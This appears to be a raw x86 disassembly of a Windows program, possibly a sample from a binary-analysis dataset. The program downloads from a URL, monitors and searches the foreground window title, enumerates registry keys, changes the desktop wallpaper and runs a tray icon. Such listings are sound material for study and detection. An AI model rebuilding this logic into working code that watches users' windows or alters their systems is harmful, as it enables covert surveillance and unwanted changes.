lea eax [ ebp + 0x8 ]
push edi
push eax
push [ ebp + 0x8 ]
push edi
call URLOpenBlockingStreamW
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
push ebx
push esi
lea edx [ ebp - 0x50 ]
mov ecx [ eax ]
push 0x1
push edx
push eax
call [ ecx + 0x30 ]
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
inc [ ebp - 0x48 ]
mov esi [ ebp - 0x48 ]
push esi
call [ malloc@IAT ]
mov ebx [ ebp + 0xc ]
mov edx eax
cmp edx edi
pop ecx
mov [ ebx ] edx
je r-xdata
xor eax eax
lea edi [ ebp - 0x8 ]
stosd [ edi ]
stosd [ edi ]
mov ecx esi
mov edi edx
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
xor edi edi
lea eax [ esi - 0x1 ]
mov esi [ ebp + 0x10 ]
push edi
push edi
push [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
push [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
push edi
push [ esi ]
mov ecx [ eax ]
push [ ebx ]
push eax
call [ ecx + 0xc ]
push 0x1
pop edi
sub_4116fe
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
call [ GetForegroundWindow@IAT ]
mov esi eax
push esi
call [ GetWindowTextLengthA@IAT ]
test eax eax
jbe r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor al al
lea ecx [ ebp - 0x1 ]
inc eax
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call [ GetWindowTextA@IAT ]
push [ tolower@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::end@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
push eax
call sub_411f4a
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
push eax
call sub_41113a
add esp 0x24
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_4012b5
test eax eax
jbe r-xdata
lea ecx [ ebp - 0x24 ]
call sub_401ad8
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor esi esi
cmp [ ebp + 0x18 ] 0x0
je r-xdata
inc edi
lea ecx [ ebp - 0x24 ]
movzx esi di
call sub_4012b5
cmp esi eax
jb r-xdata
lea ecx [ ebp - 0x24 ]
call sub_401ad8
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ ebp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x0
push esi
lea ecx [ ebp - 0x24 ]
call sub_401289
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
pop edi
pop esi
leave
retn
sub_41184a
push ebp
mov ebp esp
sub esp 0x544
lea eax [ ebp - 0xc ]
push esi
push eax
xor esi esi
push 0x20019
push esi
push r--data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebx
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x400
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push esi
push esi
push esi
lea eax [ ebp - 0x10 ]
push esi
mov edi [ RegEnumKeyExA@IAT ]
push eax
lea eax [ ebp - 0x544 ]
push eax
push esi
push [ ebp - 0xc ]
call edi
mov ebx 0x103
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
cmp eax esi
jne r-xdata
pop esi
leave
retn
inc [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x400
lea eax [ ebp - 0x8 ]
push eax
push 0x20019
lea eax [ ebp - 0x544 ]
push esi
push eax
push [ ebp - 0xc ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp eax ebx
je r-xdata
push esi
push esi
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x544 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
call edi
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
push [ ebp - 0x8 ]
push eax
call sub_40a531
push r--data
lea eax [ ebp - 0x84 ]
push [ ebp - 0x8 ]
push eax
call sub_40a531
push r--data
lea eax [ ebp - 0x64 ]
push [ ebp - 0x8 ]
push eax
call sub_40a531
push r--data
lea eax [ ebp - 0x54 ]
push [ ebp - 0x8 ]
push eax
call sub_40a531
push r--data
lea eax [ ebp - 0x44 ]
push [ ebp - 0x8 ]
push eax
call sub_40a531
push r--data
lea eax [ ebp - 0x74 ]
push [ ebp - 0x8 ]
push eax
call sub_40a531
add esp 0x48
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::empty@IAT ]
test al al
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax r--data
push r--data
lea ecx [ ebp - 0x74 ]
push eax
push ecx
lea ecx [ ebp - 0x54 ]
push eax
push ecx
lea ecx [ ebp - 0x84 ]
push eax
push ecx
lea ecx [ ebp - 0x44 ]
push eax
push ecx
lea ecx [ ebp - 0x64 ]
push eax
push ecx
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x134 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x114 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xf4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0xd4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xb4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0xa4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x124 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0xe4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x144 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0xc4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x104 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x94 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x34 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x104 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x144 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xe4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x124 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xb4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xd4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xf4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x114 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x134 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_411b89
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
sub eax 0x0
push edi
je r-xdata
push 0x1
lea eax [ ebp - 0x8 ]
sub esp 0x10
mov ebx r--data
mov ecx esp
push eax
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi r--data
push r--data
mov esi 0x80000001
push edi
push esi
call sub_40a624
add esp 0x20
lea eax [ ebp - 0x9 ]
push 0x1
sub esp 0x10
mov ecx esp
push eax
push ebx
dec eax
je r-xdata
push 0x1
lea eax [ ebp - 0x6 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi r--data
push r--data
mov esi 0x80000001
push edi
push esi
call sub_40a624
add esp 0x20
lea eax [ ebp - 0x7 ]
push 0x1
sub esp 0x10
mov ecx esp
dec eax
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_40a624
add esp 0x20
push 0x1
lea eax [ ebp - 0x4 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi r--data
push r--data
mov esi 0x80000001
push edi
push esi
call sub_40a624
add esp 0x20
lea eax [ ebp - 0x5 ]
push 0x1
sub esp 0x10
mov ecx esp
jmp r-xdata
dec eax
je r-xdata
push eax
push r--data
jmp r-xdata
push 0x1
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi r--data
push r--data
mov esi 0x80000001
push edi
push esi
call sub_40a624
add esp 0x20
lea eax [ ebp - 0x3 ]
push 0x1
sub esp 0x10
mov ecx esp
jmp r-xdata
dec eax
jne r-xdata
push 0x3
push [ ebp + 0xc ]
push 0x0
push 0x14
call [ SystemParametersInfoW@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push 0x1
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi r--data
push r--data
mov esi 0x80000001
push edi
push esi
call sub_40a624
add esp 0x20
lea eax [ ebp - 0x1 ]
push 0x1
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub_411d16
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push 0x0
mov ecx edi
mov al [ edi ]
mov [ esi ] al
call sub_4012b5
push eax
mov ecx esi
call sub_401b51
push eax
mov ecx edi
mov [ esi + 0x4 ] eax
call sub_411d79
push eax
mov ecx edi
call sub_409357
push eax
mov ecx esi
call sub_40935b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax esi
pop edi
pop esi
pop ebp
retn 0x4
sub_411d7d
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_409357
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
sub esi eax
mov ecx edi
push 0x1
push [ ebp + 0x8 ]
sar esi 0x4
call sub_411db2
mov ecx edi
call sub_409357
shl esi 0x4
add eax esi
pop edi
pop esi
pop ebp
retn 0x8
sub_411db2
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi ecx
push edi
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
sub ecx eax
sar ecx 0x4
cmp ecx ebx
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov edx eax
sub edx ecx
sar edx 0x4
cmp edx ebx
jae r-xdata
mov ecx esi
call sub_4012b5
cmp ebx eax
jae r-xdata
test ebx ebx
jbe r-xdata
mov edi ebx
shl edi 0x4
lea edx [ edi + ecx ]
push edx
push eax
push ecx
mov ecx esi
call sub_40935b
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
mov ecx eax
sub ecx [ ebp + 0x8 ]
sar ecx 0x4
sub ebx ecx
mov ecx esi
push ebx
push eax
call sub_401b29
push [ ebp + 0x10 ]
push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call sub_411f6f
add esp 0xc
add [ esi + 0x8 ] edi
jmp r-xdata
mov [ ebp + 0xc ] ebx
mov ecx esi
call sub_4012b5
mov [ ebp + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
shl ebx 0x4
push eax
push eax
sub eax ebx
mov ecx esi
push eax
call sub_40935b
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
push eax
sub eax ebx
push eax
push edi
call sub_411f8e
push [ ebp + 0x10 ]
lea eax [ ebx + edi ]
push eax
push edi
call sub_411f6f
add esp 0x18
add [ esi + 0x8 ] ebx
mov ecx esi
call sub_4012b5
mov edi eax
push 0x0
add edi [ ebp + 0xc ]
mov ecx esi
push edi
call sub_401b51
push eax
mov ecx esi
push [ ebp + 0x8 ]
mov [ ebp + 0xc ] eax
push [ esi + 0x4 ]
call sub_40935b
push [ ebp + 0x10 ]
mov ecx esi
mov [ ebp - 0x4 ] eax
push ebx
push eax
call sub_401b29
mov eax ebx
mov ecx esi
shl eax 0x4
add eax [ ebp - 0x4 ]
push eax
push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call sub_40935b
push [ esi + 0x8 ]
mov ecx esi
push [ esi + 0x4 ]
call sub_401b07
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
sub ecx eax
sar ecx 0x4
push ecx
push eax
mov ecx esi
call sub_401b64
shl edi 0x4
add edi [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0xc ] edi
call sub_4012b5
mov ecx eax
mov eax [ ebp + 0xc ]
add ecx ebx
mov [ esi + 0x4 ] eax
shl ecx 0x4
add ecx eax
mov [ esi + 0x8 ] ecx
jmp r-xdata
sub_411f0b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop ebp
retn
movsx cx [ eax ]
mov edx [ ebp + 0x10 ]
add [ ebp + 0x10 ] 0x2
inc eax
mov [ edx ] cx
jmp r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
sub_411f2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov cl [ eax ]
inc [ ebp + 0x10 ]
inc eax
mov [ edx ] cl
inc eax
jmp r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
sub_411f4a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop esi
pop ebp
retn
movsx eax [ esi ]
push eax
call [ ebp + 0x14 ]
pop ecx
inc esi
mov ecx [ ebp + 0x10 ]
inc [ ebp + 0x10 ]
mov [ ecx ] al
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_411f6f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x10 ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
add esi 0x10
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_411f8e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ ebp + 0x10 ]
pop esi
pop ebp
retn
sub [ ebp + 0x10 ] 0x10
sub esi 0x10
mov ecx [ ebp + 0x10 ]
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
cmp esi [ ebp + 0x8 ]
jne r-xdata
sub_412030
push ebp
mov ebp esp
sub esp 0x120
push esi
push edi
lea eax [ ebp - 0x120 ]
push 0x104
xor esi esi
push eax
push esi
call [ GetModuleFileNameA@IAT ]
call sub_4120e9
mov [ rw-data ] eax
lea eax [ ebp - 0x120 ]
push esi
push eax
push esi
mov [ rw-data ] 0x58
mov [ rw-data ] 0x1
mov [ rw-data ] 0x401
call [ ExtractIconA@IAT ]
push 0x40
mov [ rw-data ] eax
push [ rw-data ]
push rw-data
call [ lstrcpynA@IAT ]
push rw-data
push esi
mov [ rw-data ] 0x7
call [ Shell_NotifyIconA@IAT ]
mov edi [ GetMessageA@IAT ]
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_4120e9
push ebp
mov ebp esp
sub esp 0x40
push esi
push edi
push 0xb
xor eax eax
pop ecx
lea edi [ ebp - 0x3c ]
[ edi ]
mov esi r--data
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x40 ] 0x30
movsb [ edi ] [ esi ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x40 ]
xor esi esi
push eax
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] sub_412160
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x1c ] esi
call [ RegisterClassExA@IAT ]
test ax ax
je r-xdata
xor eax eax
push esi
push esi
push esi
push 0xfffffffd
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
call [ CreateWindowExA@IAT ]
cmp eax esi
jne r-xdata
pop edi
pop esi
leave
retn
call [ GetLastError@IAT ]
sub_412160
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
dec eax
je r-xdata
call [ CreatePopupMenu@IAT ]
push r--data
push 0x0
push 0x0
push eax
mov [ rw-data ] eax
call [ AppendMenuA@IAT ]
sub eax 0x110
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub eax 0x2f0
je r-xdata
xor eax eax
push rw-data
push 0x2
call [ Shell_NotifyIconA@IAT ]
push 0x0
call [ ExitProcess@IAT ]
mov eax [ ebp + 0x14 ]
sub eax 0x201
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ rw-data ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
sub eax 0x3
je r-xdata
leave
retn 0x10
push 0x9
push [ rw-data ]
call [ ShowWindow@IAT ]
push [ rw-data ]
call [ SetForegroundWindow@IAT ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ ShowWindow@IAT ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
call [ GetCursorPos@IAT ]
push [ ebp + 0x8 ]
call [ SetForegroundWindow@IAT ]
push 0x0
push [ ebp + 0x8 ]
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push 0x0
push [ rw-data ]
call [ TrackPopupMenu@IAT ]
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x401
jmp r-xdata
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
sub_41225e
push ebp
mov ebp esp
sub esp 0x3e8
push ebx
push esi
push edi
call [ AllocConsole@IAT ]
call [ rw-data ]
xor ebx ebx
mov [ rw-data ] eax
cmp [ ebp + 0x8 ] bl
jne r-xdata
mov eax [ _iob@IAT ]
add eax 0x20
push eax
push r--data
push r--data
call [ freopen@IAT ]
mov ecx 0xf9
xor eax eax
lea edi [ ebp - 0x3e7 ]
mov [ ebp - 0x3e8 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
or edx 0xffffffff
mov edi r--data
mov ecx edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea ebx [ ebp - 0x3e8 ]
mov eax ecx
mov esi edi
mov edi ebx
lea ebx [ ebp - 0x3e8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi r--data
mov ecx edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebx
mov ebx ecx
mov ecx edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea ebx [ ebp - 0x3e8 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi r--data
mov ecx edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebx
mov ebx ecx
mov ecx edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ ebp - 0x3e8 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ printf@IAT ]
add esp 0x10
pop edi
pop esi
pop ebx
leave
retn
push ebx
push eax
call [ ShowWindow@IAT ]
sub_412450
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_403e4f
cmp [ rw-data ] ebx
jne r-xdata
call sub_4125f6
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
